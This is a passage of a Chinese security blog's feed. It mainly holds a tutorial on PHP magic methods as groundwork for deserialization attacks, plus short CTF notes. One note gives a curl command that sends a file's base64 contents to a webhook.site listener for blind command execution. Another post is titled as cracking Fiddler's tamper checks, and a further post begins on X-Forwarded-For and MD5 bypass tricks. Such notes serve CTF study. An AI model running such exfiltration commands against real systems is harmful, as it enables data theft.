    <content type="html"><![CDATA[<p>本人在学习php反序列化时，深感无力，发现并不能将发序列化作为一个小点，要从php底层开始理解</p><p>先了解一下php的魔术方法</p><blockquote><p>__construct()类的构造函数，在类实例化对象时自动调用构造函数<br>__destruct()类的析构函数，在对象销毁之前自动调用析构函数<br>__sleep()在对象被序列化（使用 serialize() 函数）之前自动调用，可以在此方法中指定需要被序列化的属性，返回一个包含对象中所有应被序列化的变量名称的数组<br>__wakeup()在对象被反序列化（使用 unserialize() 函数）之前自动调用，可以在此方法中重新初始化对象状态。<br>__set($property, $value)当给一个对象的不存在或不可访问(private修饰)的属性赋值时自动调用，传递属性名和属性值作为参数。<br>__get($property)当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数。<br>__isset($property)当对一个对象的不存在或不可访问的属性使用 isset() 或 empty() 函数时自动调用，传递属性名作为参数。<br>__unset($property)当对一个对象的不存在或不可访问的属性使用 unset() 函数时自动调用，传递属性名作为参数。<br>__call($method, $arguments)调用不存在或不可见的成员方法时，PHP会先调用__call()方法来存储方法名及其参数<br>__callStatic($method, $arguments)当调用一个静态方法中不存在的方法时自动调用，传递方法名和参数数组作为参数。<br>__toString()当使用echo或print输出对象将对象转化为字符串形式时，会调用__toString()方法<br>__invoke()当将一个对象作为函数进行调用时自动调用。<br>__clone()当使用 clone 关键字复制一个对象时自动调用。<br>__set_state($array)在使用 var_export() 导出类时自动调用，用于返回一个包含类的静态成员的数组。<br>__debugInfo()在使用 var_dump() 打印对象时自动调用，用于自定义对象的调试信息。</p></blockquote><p>1.__construct<br>构造函数 __construct在实例化对象时便会自动执行该方法  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了构造函数1次&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);    <span class="hljs-comment">//实例化对象时触发构造函数__construct()</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);       <span class="hljs-comment">//在序列化和反序列化过程中不会触发构造函数</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.__destruct()<br>析构函数__destruct,在对象被销毁时自动执行该方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;触发了析构函数1次&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);  <span class="hljs-comment">//实例化对象结束后，代码运行完会销毁，触发析构函数_destruct()</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);     <span class="hljs-comment">//在序列化过程中不会触发</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);           <span class="hljs-comment">//在反序列化过程中会触发，反序列化得到的是对象，用完后会销毁，触发析构函数_destruct()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>以上代码总共触发两次析构函数，第一次为实例化对象后，代码运行完会，对象会被销毁，触发析构函数_destruct()；第二次在反序列化过程中会触发，反序列化得到的是对象，用完后会销毁，触发析构函数_destruct()</p></blockquote><p>3.__sleep()</p><blockquote><p>在进行序列化时，serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，可以在此方法中指定需要被序列化的属性，返回一个包含对象中所有应被序列化的变量名称的数组。然后才执行序列化操作。<br>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE级别的错误。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);      <span class="hljs-comment">//sleep执行返回需要序列化的属性名，过滤掉password变量</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);      <span class="hljs-comment">//serialize()只序列化sleep返回的变量，序列化之后的字符串：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>4.__wakeup()</p><blockquote><p>在进行反序列化时，unserialize()会检查是否存在一个魔术方法__wakeup()，如果存在，则会先调用__wakeup方法，做一些初始化工作。<br>使用__wakeup方法的原因是为了重建在序列化中可能丢失的数据库连接，或者执行其它初始化操作。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable language_">$this</span>-&gt;username;       <span class="hljs-comment">//反序列化之前触发_wakeup(),给password赋值</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;    <span class="hljs-comment">// 字符串中并没有password</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user_ser</span>));   <span class="hljs-comment">// object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125; </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>__wakeup()在反序列化unserialize()之前被调用<br>__destruct()在反序列化unserialize()之后被调用</p></blockquote><p>5.__toString()</p><blockquote><p>当使用echo或print输出对象将对象转化为字符串形式，或者将一个“对象”与“字符串”进行拼接时，会调用__toString()方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;格式不对，输出不了!&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;     <span class="hljs-comment">// 把类User实体化并赋值给$test，此时$test是个对象</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$test</span>);          <span class="hljs-comment">// 打印输出对象可以使用print_r或者var_dump，该对象输出后为：User Object(    [benben] =&gt; this is test!!)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;              <span class="hljs-comment">// 如果使用echo或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发toString()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>6.__invoke()<br>当将一个对象作为函数进行调用时会触发__invoke()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;它不是个函数!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;     <span class="hljs-comment">//把类User实例化为对象并赋值给$test</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span> -&gt;benben;     <span class="hljs-comment">//正常输出对象里的值benben</span><br><span class="hljs-variable">$test</span>();                 <span class="hljs-comment">//加()是把test当成函数test()来调用，此时触发_invoke()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>7.__call()<br>当调用不存在或不可见的成员方法时，PHP会先调用__call()方法来存储方法名及其参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt; <span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>); <span class="hljs-comment">//调用的方法callxxx()不存在,触发魔术方法call(),传参(callxxx,a);$arg1:调用的不存在的方法的名称;$arg2:调用的不存在的方法的参数；</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>__call(string $function_name, array $arguments)该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数</p></blockquote><p>8.__callStatic()<br>当调用不存在或不可见的静态方法时，会自动调用__callStatic()方法，传递方法名和参数数组作为参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);        <span class="hljs-comment">//静态调用使用&quot;::&quot;，静态调用方法callxxx()，由于其不存在，所以触发__callStatic，传参(callxxx,a)，输出：callxxx,a</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>9.__set()<br>__set($name, $value)函数，给一个对象的不存在或不可访问(private修饰)的属性赋值时，PHP就会执行__set()方法。__set()方法包含两个参数，$name表示变量名称，$value表示变量值，两个参数不可省略。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> ,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$arg2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>-&gt;var2=<span class="hljs-number">1</span>;        <span class="hljs-comment">//给不存在的成员属性var2赋值为1，自动触发__set()方法；如果有__get(),先调用__get(),再调用__set()，输出：var2,1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10.__get()<br>__get($name)函数，当程序访问一个未定义或不可见的成员变量时，PHP就会执行 __get()方法来读取变量值。__get()方法有一个参数，表示要调用的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2;         <span class="hljs-comment">//调用的成员属性var2不存在，触发__get(),把不存在的属性的名称var2赋值给$arg1，输出：var2</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>11.__isset()<br>当对一个对象的不存在或不可访问的属性使用 isset() 或 empty() 函数时自动调用，传递属性名作为参数。__isset()方法有一个参数，表示要调用的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);       <span class="hljs-comment">// 调用的成员属性var不可访问，并对其使用isset()函数或empty()函数，触发__isset()，输出：var</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>12.__unset()<br>当对一个对象的不存在或不可访问的属性使用 unset() 函数时自动调用，传递属性名作为参数。__unset()方法有一个参数，表示要调用的变量名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);        <span class="hljs-comment">// 调用的成员属性var不可访问，并对其使用unset()函数，触发__unset()，输出：var</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>.13 __clone()<br>当对象被复制执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"> </span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;__clone test&quot;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">clone</span>(<span class="hljs-variable">$test</span>)        <span class="hljs-comment">// __clone test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web2</title>
    <link href="/2024/09/24/web2/"/>
    <url>/2024/09/24/web2/</url>
    
    <content type="html"><![CDATA[<h3 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h3><h4 id="重定向到文件"><a href="#重定向到文件" class="headerlink" title="重定向到文件"></a>重定向到文件</h4><blockquote><p>cmd_here &gt; 1.txt<br>然后利用wegt命令进行文件下载</p></blockquote><h4 id="curl外带"><a href="#curl外带" class="headerlink" title="curl外带"></a>curl外带</h4><p>可以利用webhook.site建立网络端口监听，<br>然后执行<br>cmd&#x3D;curl <a href="https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/%60cat">https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/`cat</a> &#x2F;flag | base64&#96;<br>来实现base64编码获取</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>od命令</title>
    <link href="/2024/09/20/od%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/09/20/od%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>针对Fiddler4.6.2的反编译以及最新版本的破解</title>
    <link href="/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/"/>
    <url>/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1837902&highlight=fiddler+4.6.2">参考文献吾爱破解</a></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们根据作者的了解发现fiddler对软件有篡改检验，所以我们有以下的几个思路</p><blockquote><ol><li>修改本地文件使篡改检测失效</li><li>本地建议服务器伪造响应</li></ol></blockquote><h3 id="常用IL对应十六进制"><a href="#常用IL对应十六进制" class="headerlink" title="常用IL对应十六进制"></a>常用IL对应十六进制</h3>]]></content>
    
    
    <categories>
      
      <category>逆向实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>revser</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web简单利用</title>
    <link href="/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
    <url>/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>最近写一些垃圾web用到了不知道的知识，在此记录，首先是头文件绕过</p><blockquote><p>X-Forwarded-For : 简称XFF头，它代表客户端，也就是HTTP的 请求端真实的IP ，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p></blockquote><p>可以实现对web对本地的访问达到网址绕过的效果</p><h4 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h4><h5 id="相同的md5字符串"><a href="#相同的md5字符串" class="headerlink" 